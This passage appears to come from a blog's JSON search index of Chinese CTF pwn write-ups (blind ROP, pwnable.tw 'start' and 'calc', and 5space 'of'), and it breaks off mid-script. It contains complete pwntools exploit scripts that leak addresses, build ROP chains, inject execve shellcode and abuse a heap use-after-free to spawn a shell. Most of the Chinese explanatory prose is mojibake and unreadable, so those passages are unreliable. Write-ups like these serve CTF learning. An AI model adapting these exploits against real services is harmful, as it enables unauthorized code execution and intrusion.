&quot;%x caused a EOF error...&quot;%addr p.close() addr+=1 continuecsu_pop_ret = 0x4007bapop_rdi = csu_pop_ret + 9pop_rsi = csu_pop_ret +7 4 . ç¡®å®špltè¡¨â€‹ ä¸€èˆ¬æ¥è¯´è¿™é‡Œæ‰¾çš„æ˜¯è¾“å‡ºå‡½æ•°çš„pltè¡¨ï¼Œä¾‹å¦‚writeå’Œputsã€‚ â€‹ å› ä¸ºæˆ‘ä»¬ä¸çŸ¥é“ç¨‹åºä¸­æœ‰å•¥æ•°æ®æœ‰å•¥å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨0x400000å½“ä½œè¾“å‡ºçš„åœ°å€ï¼ŒELFæ–‡ä»¶çš„å¼€å¤´æ˜¯â€\\x7fELFâ€ï¼Œåªè¦çˆ†ç ´å‡ºæŸä¸ªåœ°å€èƒ½æˆåŠŸè¾“å‡ºâ€\\x7fELFâ€ï¼Œæˆ‘ä»¬å°±èƒ½ç¡®å®šæ‰¾åˆ°äº†æ­£ç¡®çš„è¾“å‡ºå‡½æ•°ã€‚ 1234567891011121314151617181920212223242526def find_puts_plt(): addr = 0x400554 while 1: try: p = remote(&quot;127.0.0.1&quot;,10000) p.recvuntil(&quot;\\n&quot;) payload = &#x27;a&#x27; * length payload+=p64(pop_rdi) payload+=p64(0x400000) #This addr is &quot;\\x7fELF&quot; payload+=p64(addr) payload+=p64(stop_gadget) p.send(payload) output = p.recv() p.close() if output.startswith(&quot;\\x7fELF&quot;): print &quot;We got the puts_plt : %x&quot;%addr return 0 else: print &quot;%x doesn&#x27;t make sence...&quot;%addr addr += 1 continue except Exception: print &quot;%x cause some error...&quot;%addr addr += 1 continueputs_plt = 0x400560 5 . æ³„éœ²éƒ¨åˆ†ç¨‹åºäºŒè¿›åˆ¶æ•°æ®ï¼Œç¡®å®šgotè¡¨â€‹ æ­¤æ—¶æˆ‘ä»¬æŒæ¡äº†puts_pltï¼Œå¯ä»¥å®ç°ä»»æ„è¯»ã€‚ â€‹ ä½†æ˜¯æˆ‘ä»¬çš„ç›®çš„æ˜¯æ‰¾åˆ°libcã€‚ä¼—æ‰€å‘¨çŸ¥pltè¡¨é¡¹æŒ‡å‘çš„æ˜¯gotè¡¨ï¼Œgotè¡¨åˆ™æŒ‡å‘libcçš„çœŸå®åœ°å€ã€‚ â€‹ æ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦æ‰¾åˆ°puts_gotã€‚ â€‹ é‚£ä¹ˆä¸ºäº†è·å–æ›´å¤šä¿¡æ¯ï¼Œæˆ‘ä»¬è¯»ä¸€æ®µELFä¸Šçš„æ•°æ®ï¼Œå¹¶ä¸”é€šè¿‡äºŒè¿›åˆ¶æ–¹å¼å†™å…¥åˆ°æ–°çš„æ–‡ä»¶ä¸­ã€‚ 123456789101112131415161718192021222324252627def dump_file(): fi = open(&quot;code&quot;,&quot;wb&quot;) result = &quot;&quot; addr = 0x400000 while addr &lt; 0x401000: p = remote(&quot;127.0.0.1&quot;,10000) print &quot;%x connecting ...&quot;%addr try: p.recvuntil(&quot;WelCome my friend,Do you know password?\\n&quot;) payload = &#x27;a&#x27; * length + p64(pop_rdi) + p64(addr)+ p64(puts_plt)+ p64(stop_gadget) p.send(payload) data = p.recv() p.close() try: data = data[:data.index(&quot;\\nWelCome&quot;)] except Exception: data = data if data == &quot;&quot;: data = &#x27;\\x00&#x27; result += data addr += len(data) except Exception: p.close() continue print result fi.write(result)puts_got = 0x601018 â€‹ é€šè¿‡ç¼–è¾‘-æ®µ-è®¾ç½®åŸºå€ï¼Œè®¾ç½®0x400000ä¸ºåŸºå€ï¼Œç„¶åæ‰¾åˆ°0x400560(ç¬¬4æ­¥ä¸­å¾—å‡ºçš„pltåœ°å€)ã€‚ â€‹ cé”®è½¬æ¢æˆä»£ç ã€‚ â€‹ çœ‹åˆ°æ­¤å¤„ä»£ç è·³è½¬åˆ°äº†0x601018ï¼Œå› æ­¤è¿™ä¸ªå°±æ˜¯puts_gotã€‚ 6 . ç¡®å®šlibcå¹¶è¿›è¡Œæ”»å‡»â€‹ æ‰¾åˆ°äº†puts_gotä¹‹åï¼Œå†é€šè¿‡LibcSearcheræ‰¾åˆ°å¯¹åº”çš„libcç‰ˆæœ¬(å¯èƒ½æœ‰å¤šä¸ª)ï¼Œç„¶åå°±å†leakå‡ºsystemçš„åœ°å€å’Œbinå­—ç¬¦ä¸²çš„åœ°å€ï¼Œå³å¯å®Œæˆæ”»å‡»ã€‚ 12345678910111213141516def attack(): p = remote(&quot;127.0.0.1&quot;,10000) p.recvuntil(&quot;\\n&quot;) payload = &#x27;a&#x27; * length + p64(pop_rdi) + p64(puts_got)+ p64(puts_plt)+ p64(stop_gadget) #We can leak the real addr of puts in the libc p.send(payload) output = p.recv() output = output[:output.index(&quot;\\nWelCome&quot;)].ljust(8,&#x27;\\x00&#x27;) puts_addr = u64(output) print hex(puts_addr) libc = LibcSearcher(&#x27;puts&#x27;,puts_addr) libc_base = puts_addr - libc.dump(&#x27;puts&#x27;) sys_addr = libc_base + libc.dump(&#x27;system&#x27;) bin_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;) payload = &#x27;a&#x27; * length + p64(pop_rdi) + p64(bin_addr)+ p64(sys_addr)+ p64(stop_gadget) p.send(payload) p.interactive() â€‹","categories":[],"tags":[{"name":"StackOverflow","slug":"StackOverflow","permalink":"http://example.com/tags/StackOverflow/"}]},{"title":"Pwnable.tw (start & calc)","slug":"pwnable","date":"2020-07-25T00:19:47.000Z","updated":"2021-03-24T09:47:00.903Z","comments":true,"path":"2020/07/25/pwnable/","link":"","permalink":"http://example.com/2020/07/25/pwnable/","excerpt":"â€‹ æœ€è¿‘è¾¹çœ‹ä¹¦è¾¹åˆ·pwnable.twï¼Œè®°å½•ä¸€ä¸‹write upã€‚","text":"â€‹ æœ€è¿‘è¾¹çœ‹ä¹¦è¾¹åˆ·pwnable.twï¼Œè®°å½•ä¸€ä¸‹write upã€‚ 0x00 . startA . Analysisâ€‹ ä¹‹å‰çœ‹è¿™ä¸ªé¢˜çš„æ—¶å€™ä¸€è„¸æ‡µé€¼ï¼Œäº‹éš”ç»å¹´æ„Ÿè§‰è²Œä¼¼èƒ½åšã€‚ã€‚ã€‚ â€‹ ç¨‹åºé‡Œåªæœ‰ä¸€ä¸ªæµ“çœ‰å¤§çœ¼çš„startå‡½æ•°ï¼š â€‹ å…¶å®å·®ä¸å¤šæ˜¯è¿™ä¸¤è¡Œä»£ç ï¼Œä¸€ä¸ªè¾“å‡ºä¸€ä¸ªè¾“å…¥ã€‚ 123esp = &quot;Let&#x27;s start the CTF:&quot;;write(1,esp,0x14);read(0,esp,0x3C); â€‹ è€Œä¸”æ²¡NXä¿æŠ¤ï¼š â€‹ é‚£æœæ–­shellcodeå‘—ã€‚è™½ç„¶ä¸çŸ¥é“æ ˆåº•çš„ä½ç½®ï¼Œä½†å¯ä»¥æ‰¾åˆ°startå‡½æ•°ç»“æŸæ—¶æ‰§è¡Œäº†â€add esp,14hâ€çš„æ±‡ç¼–è¯­å¥ï¼Œå¯ä»¥çŒœæµ‹æ ˆçš„å¤§å°ä¸º0x14ï¼Œå› ä¸ºæ ˆé¡¶å°±æ˜¯æˆ‘ä»¬è¾“å…¥å­—ç¬¦ä¸²çš„åœ°æ–¹ï¼Œæ‰€ä»¥paddingçš„å¤§å°ä¹Ÿæ˜¯è¿™ä¹ˆå¤šã€‚ â€‹ ä¸è¿‡ç¬¬ä¸€æ¬¡è¾“å…¥æ—¶ï¼Œè¦å…ˆè¿”å›åˆ°0x08048087è¿™ä¸ªåœ°å€ï¼Œæ­¤æ—¶æ ˆå¸§å·²ç»æ”¶å›ï¼Œå†ä¸€æ¬¡æ‰§è¡Œwrite(1,esp,0x14)ï¼Œå°±èƒ½leakå‡ºæ ˆåº•åœ°å€äº†ã€‚ â€‹ ç¬¬äºŒæ¬¡è¾“å…¥ï¼Œå†å°†è¿”å›åœ°å€æ”¹æˆæ ˆåº•+0x14ï¼Œä¹Ÿå°±æ˜¯shellcodeçš„å¼€å¤´åœ°å€ï¼Œå³å¯æ‰§è¡Œshellcodeã€‚ â€‹ ç„¶åå¼€å§‹å†™shellcodeï¼š 12345678xor ecx,ecx;xor edx,edx;push ecx; #å­—ç¬¦ä¸²ç»“å°¾ push 0x68732f6e; #&#x27;n/sh&#x27;push 0x69622f2f; #&#x27;//bi&#x27;mov ebx,esp;mov eax,0xb;int 0x80; â€‹ ç„¶åpythonè½¬æœºå™¨æ•°ï¼š 12shellcode = &quot;xor ecx,ecx;xor edx,edx;push ecx;push 0x68732f6e;push 0x69622f2f;mov ebx,esp;mov eax,0xb;int 0x80;&quot;shellcode = asm(shellcode) â€‹ ç„¶åè·‘payloadï¼š 12345678910111213141516171819202122232425262728from pwn import *#p = process(&quot;./start&quot;)p = remote(&#x27;chall.pwnable.tw&#x27;,10000)p.recvuntil(&quot;:&quot;)payload = &#x27;A&#x27;*20 + p32(0x08048087)p.send(payload)stack_addr = u32(p.recv(4)) print &quot;Here is addr:&quot;+hex(stack_addr)&#x27;&#x27;&#x27;asm:xor ecx,ecx;xor edx,edx;push edx;push 0x68732f6e;push 0x69622f2f;mov ebx,esp;mov eax,0xb;int 0x80;&#x27;&#x27;&#x27;#shellcode=&#x27;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&#x27;shellcode = asm(&#x27;xor ecx,ecx;xor edx,edx;push edx;push 0x68732f6e;push 0x69622f2f ;mov ebx,esp;mov eax,0xb;int 0x80&#x27;)payload = &#x27;A&#x27;*0x14 + p32(stack_addr+0x14)+shellcodep.send(payload)p.interactive() 0x01 . calcA . Analysisâ€‹ ä¾‹è¡Œå…¬äº‹å¦‚ä¸‹ï¼š â€‹ ä¸»è¦çš„å‡½æ•°æ˜¯calc()ï¼Œåˆ†åˆ«åˆå®ç°äº†get_expr(),init_pool(),parse()ä¸‰ä¸ªå‡½æ•°ã€‚ â€‹ get_expr()æ¥å—ç”¨æˆ·è¾“å…¥è®¡ç®—è¡¨è¾¾å¼ï¼Œå¹¶è¿‡æ»¤æ‰é™¤äº†â€œ+-*ã€%0123456789â€ä¹‹å¤–çš„å­—ç¬¦ï¼Œinit_pool()ç”³è¯·å †å—æ¥å­˜æ”¾æ•°ç»„å¹¶ä¸”åˆå§‹åŒ–ï¼Œç¨‹åºä¸­çš„è‹¥å¹²ä¸ªè¿ç®—æ•°å°±è¢«å­˜æ”¾åœ¨è¿™ä¸ªæ•°ç»„ä¸­ï¼Œparse()è¿›è¡Œè¡¨è¾¾å¼çš„è§£æå¹¶ä¸”è¿ç®—ã€‚ â€‹ ä¸»è¦æ¥çœ‹çœ‹parseå‡½æ•°çš„æ‰§è¡Œæœºåˆ¶ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384signed int __cdecl parse_expr(int str, _DWORD *num)&#123; int v2; // ST2C_4 int v4; // eax int v5; // [esp+20h] [ebp-88h] int i; // [esp+24h] [ebp-84h] int j; // [esp+28h] [ebp-80h] char *s1; // [esp+30h] [ebp-78h] int v9; // [esp+34h] [ebp-74h] char operator[100]; // [esp+38h] [ebp-70h] unsigned int v11; // [esp+9Ch] [ebp-Ch] v11 = __readgsdword(0x14u); v5 = str; j = 0; bzero(operator, 0x64u); for ( i = 0; ; ++i ) &#123; if ( (*(i + str) - &#x27;0&#x27;) &gt; 9 ) &#123; v2 = i + str - v5; s1 = malloc(v2 + 1); memcpy(s1, v5, v2); s1[v2] = 0; if ( !strcmp(s1, &quot;0&quot;) ) &#123; puts(&quot;prevent division by zero&quot;); fflush(stdout); return 0; &#125; v9 = atoi(s1); if ( v9 &gt; 0 ) &#123; v4 = (*num)++; num[v4 + 1] = v9; &#125; if ( *(i + str) &amp;&amp; (*(i + 1 + str) - &#x27;0&#x27;) &gt; 9 ) &#123; puts(&quot;expression error!&quot;); fflush(stdout); return 0; &#125; v5 = i + 1 + str; if ( operator[j] ) &#123; switch ( *(i + str) ) &#123; case &#x27;%&#x27;: case &#x27;*&#x27;: case &#x27;/&#x27;: if (operator[j] != &#x27;+&#x27; &amp;&amp; operator[j] != &#x27;-&#x27; ) &#123; eval(num, operator[j]); operator[j] = *(i + str); &#125; else &#123; operator[++j] = *(i + str); &#125; break; case &#x27;+&#x27;: case &#x27;-&#x27;: eval(num, operator[j]); operator[j] = *(i + str); break; default: eval(num, operator[j--]); break; &#125; &#125; else &#123; operator[j] = *(i + str); &#125; //Check Point if ( !*(i + str) ) break; &#125; &#125; while ( j &gt;= 0 ) eval(num, operator[j--]); return 1;&#125; â€‹ å¤§æ„æ˜¯éå†æ¯ä¸ªå­—ç¬¦ï¼ŒæŠŠæ¯ä¸ªè¿ç®—æ•°ä¿å­˜åœ¨numæ•°ç»„(æ­¤å¤„numçš„ä¼ å‚æ˜¯intå‹ï¼Œå› æ­¤åé¢æ•°ç»„èµ‹å€¼å‡ç”¨æŒ‡é’ˆå¯»å€)ï¼Œè€Œä¸”ä»ä¸‹æ ‡[1]å¼€å§‹ä¿å­˜ï¼Œnum[0]åˆ™ç”¨æ¥å®æ—¶ä¿å­˜æ“ä½œæ•°çš„ä¸ªæ•°ã€‚æ¯ä¸€ä¸ªè¿ç®—ç¬¦è¢«å­˜äºoperatoræ•°ç»„ä¸­ã€‚ â€‹ åœ¨ç…ç…å®é™…ç”¨æ¥è¿›è¡Œè¿ç®—çš„eval()å‡½æ•°ï¼š â€‹ è¿ç®—æ–¹å¼ä¸º:ç”¨num[0]å½“ä½œä¸‹æ ‡æ‰¾å¯¹åº”çš„è¿ç®—æ•°ï¼Œå†å°†å…¶ä¸å‰é¢çš„è¿ç®—æ•°(å³num[num[0]-1])è¿›è¡Œè®¡ç®—ï¼Œç»“æœè¿”å›åˆ°åè€…ã€‚ â€‹ ä¸¾ä¾‹ï¼šè¾“å…¥1+3æ—¶ï¼Œnum[0] = 2ï¼Œnum[1] = 1ï¼Œnum[2] = 3 â€‹ è¿ç®—ä¹‹åï¼šnum[0] = 1ï¼Œnum[1] = 4ã€‚ â€‹ è€Œä¸”parseå‡½æ•°ä¸­çš„æ£€æŸ¥ç‚¹ä¼šæ£€æŸ¥num[0]æ˜¯å¦ä¸º0ã€‚ â€‹ è€Œè¿™é¢˜çš„æ¼æ´ç‚¹åœ¨evalå‡½æ•°é‡Œã€‚å‡½æ•°ä¸­è§„å®šæœ€åä¸€ä¸ªè¿ç®—æ•°ä¸å‰è€…è¿›è¡Œè¿ç®—ï¼Œä½†æ˜¯æ²¡æœ‰è€ƒè™‘è¿‡ç¬¬ä¸€ä¸ªè¿ç®—æ•°ä¸å­˜åœ¨çš„æƒ…å†µã€‚ â€‹ ä¸¾ä¾‹ï¼šè¾“å…¥+300æ—¶ï¼Œnum[0] = 1ï¼Œnum[1] = 300ï¼Œæ‰§è¡Œå¦‚ä¸‹ä»£ç ï¼š 1234 num[*num - 1] += num[*num];// num[num[0]-1] += num[num[0]]// num[1-1] += num[1]// num[0] += num[1] â€‹ ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬è¾“å…¥çš„300ï¼Œé‚£ä¹ˆ301ä¼šè¢«å­˜æ”¾åœ¨num[0]ä¸­ï¼Œä½†æ˜¯num[0]è¿ç®—ç»“æŸå-1ï¼Œå› æ­¤ä»ç„¶æ˜¯300ã€‚è€Œåœ¨å‡½æ•°calcä¸­æˆ‘ä»¬çŸ¥é“ï¼Œnum[i-1]ä¼šè¢«ã€‚printfè¾“å‡ºï¼Œè€Œcalcä¸­çš„iç›¸å½“äºparseå’Œevalä¸­çš„num[0]ã€‚æœ€åè¾“å‡ºçš„æ˜¯calcå‡½æ•°ä¸­çš„num[299]ï¼Œç›¸å½“äºè¾“å‡ºäº†parseä¸­çš„num[300]ã€‚æ‰€ä»¥è¯´ï¼Œâ€+xâ€å¥å¼å¯ä»¥è¾¾æˆæ ˆä¸Šçš„ä»»æ„è¯»ã€‚ â€‹ å†ä¸¾ä¾‹ï¼šè¾“å…¥+300+1024æ—¶ï¼Œnum[0] = 2ï¼Œnum[1] = 300ï¼Œnum[2] = 1024ï¼Œä½†æ˜¯ä¸Šé¢æˆ‘ä»¬è¯´è¿‡ï¼Œç¬¬ä¸€æ­¥è¿ç®—ç»“æŸåï¼Œnum[0]ä¸º302ï¼Œè‡ªå‡åä¸º301ï¼Œå› æ­¤ä¹‹åä¼šæ‰§è¡Œå¦‚ä¸‹ä»£ç ï¼š 1234 num[*num - 1] += num[*num];// num[num[0]-1] += num[num[0]]// num[301-1] += num[2]// num[300] += num[2] â€‹ æ‰€ä»¥æˆ‘ä»¬åœ¨num[2]ä¸­å†™çš„ä¸œè¥¿ï¼Œéƒ½ä¼šè¢«åŠ åˆ°num[300]é‡Œé¢ã€‚è¿™é‡Œçš„num[1]å’Œnum[2]éƒ½å¯æ§ï¼Œä¹Ÿå°±å®ç°äº†æ ˆä¸Šä»»æ„åœ°å€å†™ã€‚ B . Attackâ€‹ è™½ç„¶ç¨‹åºåœ¨æ ˆä¸Šå¼€å¯äº†canaryï¼Œä½†æ˜¯ä¸Šè¿°çš„ä»»æ„åœ°å€å†™æ˜¯å®šå‘çš„ï¼Œä¸ä¼šç ´åcanaryã€‚ç¨‹åºè¿˜å¼€å¯äº†æ ˆä¸Šä¸å¯æ‰§è¡Œä¿æŠ¤ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦é€šè¿‡syscallè°ƒç”¨execveã€‚ â€‹ 0x5A0Ã·4 = 360ï¼Œæ‰€ä»¥num[0]åˆ°calcå‡½æ•°çš„æ ˆåº•ä¸º360ä¸ªå•ä½ã€‚æ ˆä¸Šç»“æ„å¤§è‡´å¦‚ä¸‹ï¼š â€‹ stack of mainä¸Šé¢éƒ½å±äºcalcçš„æ ˆå¸§ã€‚è€Œæˆ‘ä»¬è¦æ”¹å†™çš„ropé“¾å’Œæ ˆç»“æ„å¦‚ä¸‹ï¼š â€‹ å…¶ä»–çš„æ”¹å†™éƒ½æ¯”è¾ƒç®€å•ï¼Œé‡ç‚¹åœ¨äºâ€œ/bin/shâ€å­—ç¬¦ä¸²ï¼Œè¦è®©å‡½æ•°æˆåŠŸè°ƒç”¨ï¼Œå°±ä¸èƒ½è®©ä»–å±äºcalcå‡½æ•°å’Œexecveå‡½æ•°çš„æ ˆå¸§ä¸­ï¼Œä»¥å…è¢«æ¸…ç©ºã€‚æ‰€ä»¥å†™åœ¨äº†int 80åœ°å€çš„åé¢ã€‚ â€‹ é‚£ä¹ˆå¦‚ä½•æ±‚å‡ºè¿™ä¸ªåœ°å€å‘¢ï¼Ÿç”±ä¸Šå›¾æˆ‘ä»¬å¯ä»¥çœ‹å‡ºcalcæ ˆå¸§ä¸­çš„old ebpæˆ‘ä»¬ä¹Ÿå¯ä»¥è¯»å‡ºæ¥ï¼Œå› ä¸ºè°ƒç”¨calcçš„ä¸Šå±‚å‡½æ•°æ˜¯mainï¼Œæ‰€ä»¥è¿™ä¸ªold ebpå°±æ˜¯mainå‡½æ•°çš„ebpã€‚äºæ˜¯æˆ‘ä»¬çŸ¥é“äº†æ ˆåº•ã€‚ä¸è¿‡è¿™ä¸ªebpæŒ‡å‘çš„ç¡®åˆ‡ä½ç½®æˆ‘ä»¬ä¸çŸ¥é“ï¼Œå› æ­¤åªèƒ½å†æ‰¾æ‰¾å…¶ä»–åç§»ã€‚åœ¨mainå‡½æ•°çš„æ±‡ç¼–ä»£ç ä¸­ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥æ±‚å‡ºespçš„å€¼ã€‚ â€‹ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¿›è€Œæ±‚å‡ºmainå‡½æ•°çš„æ ˆå¸§å¤§å°ä¸ºebp-esp+4ï¼Œå› ä¸ºebpå’Œespæ‰€åœ¨çš„å•ä½éƒ½ç®—mainå‡½æ•°çš„æ ˆå¸§ï¼Œå› æ­¤éœ€è¦åŠ 4ã€‚ â€‹ çŸ¥é“main_sizeä¹‹åï¼Œå†ç”¨ebp - main_sizeï¼Œå°±æ±‚å‡ºäº†mainå‡½æ•°çš„æ ˆé¡¶ï¼Œæˆ–è€…è¯´calcæ ˆåº•å‘ä¸‹çš„ä¸€ä¸ªå•ä½ï¼Œä¹Ÿå°±æ˜¯num[361]çš„ä½ç½®ã€‚è€Œæˆ‘ä»¬çŸ¥é“binè¯­å¥çš„åœ°å€åœ¨num[368]ï¼Œå› æ­¤ebp - main_size + 4*8å°±æ˜¯æˆ‘ä»¬è¦è¾“å…¥â€/bin/shâ€çš„åœ°å€ã€‚ C . Exploit12345678910111213141516171819202122232425262728293031323334from pwn import *#context.log_level = &#x27;debug&#x27;#p = process(&quot;./calc&quot;)p = remote(&quot;chall.pwnable.tw&quot;,10100)int80_addr = 0x08049a21pop_eax = 0x0805c34bpop_edx = 0x0804848fpop_ecx_pop_ebx = 0x080701d1stack = [pop_eax,0xB,pop_edx,0,pop_ecx_pop_ebx,0,0,int80_addr,u32(&quot;/bin&quot;),u32(&quot;/sh\\x00&quot;)]print p.recv()p.sendline(&quot;+360&quot;)i=p.recv()ebp = int(i)+0x100000000esp = (ebp&amp;0xFFFFFFF0)-0x10main_size = ebp - esp + 4print main_sizerop_size = 4*8stack[6] = int(i)-main_size+rop_sizei = 0for i in range(0,10): index = 361 + i p.sendline(&quot;+&quot;+ str(index)) data = int(p.recvline()) if( stack[i]&gt;data): p.sendline(&quot;+&quot;+str(index)+&quot;+&quot;+str(stack[i]-data)) else: p.sendline(&quot;+&quot;+str(index)+str(stack[i]-data)) result = int(p.recvline()) print &quot;num[&quot;+str(index)+&quot;] : &quot;+str(hex(result))p.sendline(&quot;halo....&quot;)p.interactive() â€‹ æœ€åè¿˜å¾—sendlineä¸€ä¸‹æ‰èƒ½getshellã€‚","categories":[],"tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://example.com/tags/WriteUp/"}]},{"title":"5space (of-twiceå¤ç°)","slug":"2020_5space","date":"2020-07-13T12:14:08.000Z","updated":"2021-03-27T01:09:17.506Z","comments":true,"path":"2020/07/13/2020_5space/","link":"","permalink":"http://example.com/2020/07/13/2020_5space/","excerpt":"â€‹ 6æœˆä»½çš„ç¬¬äº”ç©ºé—´ï¼Œä¾ç„¶å•¥ä¹Ÿæ²¡åšå‡ºæ¥ï¼Œä¸ä»…å¦‚æ­¤ï¼Œå¤ç°è¿˜å¤ç°äº†å¥½å‡ å¤©ï¼Œç®—æ˜¯å¤§è‡´ä¸Šå¼„æ˜ç™½æ€è·¯äº†ã€‚è®°å½•ä¸€ä¸‹ä»¥åå¤ä¹ ç”¨ã€‚","text":"â€‹ 6æœˆä»½çš„ç¬¬äº”ç©ºé—´ï¼Œä¾ç„¶å•¥ä¹Ÿæ²¡åšå‡ºæ¥ï¼Œä¸ä»…å¦‚æ­¤ï¼Œå¤ç°è¿˜å¤ç°äº†å¥½å‡ å¤©ï¼Œç®—æ˜¯å¤§è‡´ä¸Šå¼„æ˜ç™½æ€è·¯äº†ã€‚è®°å½•ä¸€ä¸‹ä»¥åå¤ä¹ ç”¨ã€‚ 0x00 . ofâ€‹ é¢˜ç›®ç›´æ¥ç»™çš„å°±æ˜¯ä¸€ä¸ª.cçš„æºç ï¼Œçœ‹æºç remoteè§£é¢˜ã€‚æºç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138#include&lt;stdlib.h&gt;#include&lt;stdio.h&gt;#include&lt;unistd.h&gt;#define NUM 0x10char* chunks[NUM];unsigned long cookie;#define SIZE 0x100void init_io()&#123; setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); setvbuf(stderr, 0, 2, 0); int fd = open(&quot;/dev/urandom&quot;, 0); if(fd == -1) &#123; exit(-1); &#125; read(fd, &amp;cookie, 8); close(fd);&#125;unsigned long get_int()&#123; unsigned long res; scanf(&quot;%ld&quot;, &amp;res); return res;&#125;void allocate()&#123; unsigned long idx; printf(&quot;Index: &quot;); idx = get_int(); if(idx &gt;= NUM)&#123; return ; &#125; char* buf = malloc(SIZE); if(buf == NULL)&#123; puts(&quot;allocate failed&quot;); return; &#125; chunks[idx] = buf; unsigned long* p = chunks[idx] + SIZE - 8; *p = cookie; puts(&quot;Done!&quot;);&#125;void delete()&#123; unsigned long idx; printf(&quot;Index: &quot;); idx = get_int(); if(idx &gt;= NUM || chunks[idx] == NULL)&#123; return ; &#125; unsigned long* p = chunks[idx] + SIZE - 8; if(*p != cookie) return; *p = 0; free(chunks[idx]);&#125;void show()&#123; unsigned long idx; printf(&quot;Index: &quot;); idx = get_int(); if(idx &gt;= NUM || chunks[idx] == NULL)&#123; return ; &#125; unsigned long* p = chunks[idx] + SIZE - 8; if(*p != cookie) return; write(1, &quot;Content: &quot;, strlen(&quot;Content: &quot;)); write(1, chunks[idx], SIZE - 8); write(1, &quot;\\n&quot;, 1);&#125;void edit()&#123; unsigned long idx; printf(&quot;Index: &quot;); idx = get_int(); if(idx &gt;= NUM || chunks[idx] == NULL)&#123; return ; &#125; unsigned long* p = chunks[idx] + SIZE - 8; if(*p != cookie) return; printf(&quot;Content: &quot;); read(0, chunks[idx], SIZE);&#125;void menu()&#123; puts(&quot;1. allocate&quot;); puts(&quot;2. edit&quot;); puts(&quot;3. show&quot;); puts(&quot;4. delete&quot;); puts(&quot;5. exit&quot;); printf(&quot;Your choice: &quot;);&#125;int main()&#123; init_io(); puts(&quot;Made on Ubuntu 18.04&quot;); while(1) &#123; menu(); unsigned long choice = get_int(); switch(choice) &#123; case 1: allocate(); break; case 2: edit(); break; case 3: show(); break; case 4: delete(); break; case 5: exit(0); break; default: puts(&quot;Unknown&quot;); break; &#125; &#125; return 0;&#125; â€‹ çœ‹ä¸Šå»æ˜¯ä¸ªheapé¢˜ï¼Œè€Œä¸”æ²¡æœ‰double freeï¼Œä½†æ˜¯æœ‰UAFã€‚ä¸è¿‡è¿™ä¸ªé¢˜ç›®åœ¨æ¯ä¸€ä¸ªchunkä¸­å¡è¿›äº†ä¸€ä¸ªcookiesï¼Œcookieséšæœºç”Ÿæˆï¼Œæ‰€ä»¥è¯´å¦‚æœè¦æ³„éœ²èµ·æ¥å°±ä¼šå¾ˆéº»çƒ¦ã€‚ä¸è¿‡çœ‹äº†ä¸å°‘write upï¼Œéƒ½è¯´è¿™é¢˜åœ¨éƒ¨ç½²ä¸Šæœ‰ç‚¹é—®é¢˜ï¼Œremoteè¿‡å»ä¸å­˜åœ¨cookiesçš„ã€‚æ‰€ä»¥å¯ä»¥æ­£å¸¸æ€è·¯ç›´æ¥å†™ã€‚ â€‹ ç”¨UAFå¯ä»¥æ³„éœ²å‡ºlibcåŸºè´¨ï¼Œæ”¹å†™free_hookæˆ–è€…malloc_hookï¼Œä½¿å…¶æŒ‡å‘systemï¼Œå†freeæ‰å†™ç€â€/bin/shâ€çš„å †ï¼Œå°±ç›¸å½“äºæ‰§è¡Œäº†system(â€œ/bin/shâ€)ã€‚ â€‹ ä¸è¿‡è¿™é¢˜ç¢°åˆ°äº†ä¸€ä¸ªæ–°çš„æœºåˆ¶tcacheã€‚tcacheæ˜¯åœ¨libc2.23ä¹‹åå¼•å…¥çš„ï¼Œè·Ÿglibcä¸­çš„å„ç§binç±»ä¼¼ï¼Œæ˜¯ä¸€ä¸ªå¯¹chunkè¿›è¡Œç”³è¯·é‡Šæ”¾æ“ä½œæ—¶ä¼šç”¨åˆ°çš„ä¸€ä¸ªå†…å­˜æ± ã€‚tcacheæ˜¯64ä¸ªå•å‘é“¾è¡¨ï¼Œæ¯ä¸ªé“¾è¡¨æœ€å¤š7ä¸ªèŠ‚ç‚¹(chunk)ï¼Œchunkçš„å¤§å°åœ¨32bitä¸Šæ˜¯12åˆ°512ï¼ˆ8byteé€’å¢ï¼‰ï¼›åœ¨64bitsä¸Šæ˜¯24åˆ°1024ï¼ˆ16bytesé€’å¢ï¼‰ã€‚ â€‹ åœ¨è¿™é¢˜ä¸­ï¼Œç”³è¯·chunkçš„å¤§å°ç»Ÿä¸€ä¸º0x100ï¼Œå±äºunsort binï¼Œæ‰€ä»¥æˆ‘ä»¬å¦‚æœé‡Šæ”¾8ä¸ªchunkï¼Œæ‰ä¼šä½¿ç¬¬8ä¸ªchunkå¤„äºunsort binä¸­ã€‚è€Œæ­¤æ—¶unsort binä¸­ä»…æœ‰ä¸€ä¸ªchunkï¼Œå…¶fdå’Œbkéƒ½æŒ‡å‘main_arenaçš„ä¸€å®šåç§»å¤„ã€‚å³å¯leakå‡ºlibcã€‚ â€‹ payloadå‚è€ƒ 123456789101112131415161718192021222324252627282930313233343536from pwn import *context.log_level=&quot;debug&quot;def add(index): p.sendlineafter(&quot;: &quot;,&quot;1&quot;) p.sendlineafter(&quot;: &quot;,str(index))def edit(index,note): p.sendlineafter(&quot;: &quot;,&quot;2&quot;) p.sendlineafter(&quot;Index: &quot;,str(index)) p.sendafter(&quot;Content: &quot;,note)def show(index): p.sendlineafter(&quot;: &quot;,&quot;3&quot;) p.sendlineafter(&quot;Index: &quot;,str(index))def delete(index): p.sendlineafter(&quot;: &quot;,&quot;4&quot;) p.sendlineafter(&quot;: &quot;,str(index))#p=remote(&quot;121.36.74.70&quot;,9999)p=process(&quot;./of&quot;)for i in range(9): add(i)for i in range(8): delete(i)show(7)p.recvuntil(&quot;: 